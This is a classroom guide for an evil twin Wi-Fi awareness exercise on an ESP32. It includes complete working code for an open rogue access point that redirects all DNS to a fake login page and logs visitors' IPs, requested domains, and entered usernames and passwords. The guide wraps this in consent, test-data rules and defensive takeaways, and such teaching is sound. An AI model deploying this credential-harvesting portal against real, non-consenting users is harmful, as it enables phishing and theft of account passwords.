# Evil Twin / Fake Wi-Fi Awareness Activity Guideline
### (ESP32 DevKit V1 only — no additional hardware)

This guideline is designed for students to experience the **evil twin / rogue AP** attack technique in a safe, controlled, **consent-based** classroom setting. The ESP32 broadcasts a fake "free Wi-Fi" network, redirects connecting devices to a "login page" (captive portal) without ever giving them real internet access, and logs the entire interaction.

---

## ⚠️ Read This First: Ethical and Legal Framework

- **Consent is required:** Before starting, clearly tell all students that this is a demo, and that the moment they connect, their MAC address, the domains they try to visit, and whatever they type into the fake login form will be logged.
- **No real data:** Tell students not to enter **real** passwords or real emails into the fake form — only test data (`test123`, `example@example.com`).
- **Scope limit:** This activity should only be run inside the classroom, under teacher supervision, on consenting devices. If you want to impersonate the school's real SSID, discuss this with IT/administration beforehand.
- **The goal is awareness:** Always open the logs to the class at the end and discuss them — the point is to show "look how easily we can be fooled," not to run a real attack.

---

## 1. Required Materials

- ESP32 DevKit V1
- Micro-USB data cable
- Arduino IDE (with the ESP32 board package installed)

Libraries used (all bundled with the ESP32 package):
- `WiFi.h`
- `DNSServer.h`
- `WebServer.h`
- `SPIFFS.h`

---

## 2. How It Works (Conceptual Overview)

1. The ESP32 opens an open (unencrypted) AP (e.g. `Free_School_WiFi`)
2. Its built-in DNS server answers **every** domain query with its own IP
3. The connecting device detects "no internet" and automatically falls into the captive portal page (the "Wi-Fi sign-in required" screen phones show)
4. The fake login page shows a "Sign in to continue" form
5. On submit: MAC address, timestamp, requested domains, and the submitted form data are logged to SPIFFS
6. Real internet access is **never** granted — this is intentional; it's enough to demonstrate how the attack works

---

## 3. Full Code

```cpp
// evil_twin_demo.ino
// Educational rogue AP / captive portal demo — classroom use only, with student consent.

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

const char* ap_ssid = "Free_School_WiFi"; // consider a real-sounding but non-impersonating name
DNSServer dnsServer;
WebServer webServer(80);

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

// --- Logging helper ---
void logEvent(String info) {
  File f = SPIFFS.open("/log.txt", FILE_APPEND);
  if (f) {
    f.println(info);
    f.close();
  }
  Serial.println(info);
}

// --- Fake login page shown to every connecting device ---
void handlePortal() {
  String ip = webServer.client().remoteIP().toString();
  logEvent("PORTAL VIEW from " + ip + " requested host: " + webServer.hostHeader());

  String html = R"(
    <html><head><title>Wi-Fi Login Required</title></head>
    <body style="font-family:sans-serif;text-align:center;margin-top:50px;">
      <h2>Free School WiFi</h2>
      <p>Please sign in to continue.</p>
      <form action="/submit" method="POST">
        <input type="text" name="username" placeholder="Username"><br><br>
        <input type="password" name="password" placeholder="Password"><br><br>
        <input type="submit" value="Connect">
      </form>
      <p style="font-size:12px;color:gray;">This is a classroom cybersecurity demo. Do not enter real credentials.</p>
    </body></html>
  )";

  webServer.send(200, "text/html", html);
}

// --- Handle fake form submission ---
void handleSubmit() {
  String ip = webServer.client().remoteIP().toString();
  String user = webServer.arg("username");
  String pass = webServer.arg("password");

  // Log what was submitted (students should only enter fake/test data)
  logEvent("SUBMIT from " + ip + " | username=" + user + " | password=" + pass);

  webServer.send(200, "text/html",
    "<h3>Connection failed. Please try again.</h3><a href='/'>Back</a>");
}

// --- Show collected logs (for classroom review) ---
void handleLogs() {
  File f = SPIFFS.open("/log.txt", FILE_READ);
  String content = "No logs yet.";
  if (f) {
    content = f.readString();
    f.close();
  }
  webServer.send(200, "text/plain", content);
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin(true);

  // Start open (unencrypted) access point
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid); // no password = open network, like real "free wifi" traps

  // DNS server answers every query with the ESP32's own IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Any path requested gets redirected to the fake portal
  webServer.onNotFound(handlePortal);
  webServer.on("/", handlePortal);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.on("/logs", handleLogs); // teacher/student review page

  webServer.begin();
  logEvent("=== New session started ===");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
```

---

## 4. Setup and Test Steps

1. Upload the code to the ESP32, open the Serial Monitor
2. Connect a phone/laptop to the `Free_School_WiFi` network (no password)
3. Try to open any website (e.g. `instagram.com`) — the device should automatically fall into the fake login page
4. Enter **test data** into the fake form (`test / test123`) and submit
5. From another device, go to `http://192.168.4.1/logs` (or get redirected there) to review the collected logs

---

## 5. Classroom Discussion Activity

Once the logs are shown on screen, ask the class:

- "You never actually reached the real internet — you just filled out a form. So why was it so easy to fall for it?"
- "Would you have noticed this at an airport or coffee shop Wi-Fi in real life?"
- "What should we watch for to catch this kind of attack?" (HTTPS lock icon, a familiar network suddenly asking for login, suspicious SSIDs, etc.)

---

## 6. Defense / Awareness Takeaways (To Share With Students)

| Risk | Real-World Mitigation |
|---|---|
| Fake AP with a matching name | Don't trust unknown "Free WiFi" networks; use a VPN |
| Entering a real password into a captive portal | Never enter your main account passwords into a third-party Wi-Fi login form |
| Unnoticed DNS redirection | Be suspicious of an unexpected "login page" appearing in your browser |
| Open (unencrypted) network | Use mobile data/hotspot when possible; avoid sensitive activity on open networks |

---

## 7. Common Issues

| Issue | Fix |
|---|---|
| Captive portal doesn't open automatically | Manually navigate to `http://192.168.4.1` |
| `SPIFFS.begin()` fails | Use `SPIFFS.begin(true)` (formats on first run) |
| Some phones disconnect immediately | Normal — modern OSes sometimes auto-disconnect when they detect "no internet"; this is part of the lesson (ask students why it happens) |
| `/logs` page is empty | At least one device needs to have hit the portal and submitted the form first |

---

## 8. Student Checklist

- [ ] Consent/briefing was given before the activity; understood that only test data should be used
- [ ] Connected to the fake AP and saw the captive portal
- [ ] Submitted the form with test data
- [ ] Reviewed their own entry (and classmates', if applicable) on the `/logs` page
- [ ] Contributed at least one observation/question to the class discussion
- [ ] Wrote 2-3 ways to protect against this attack in real life
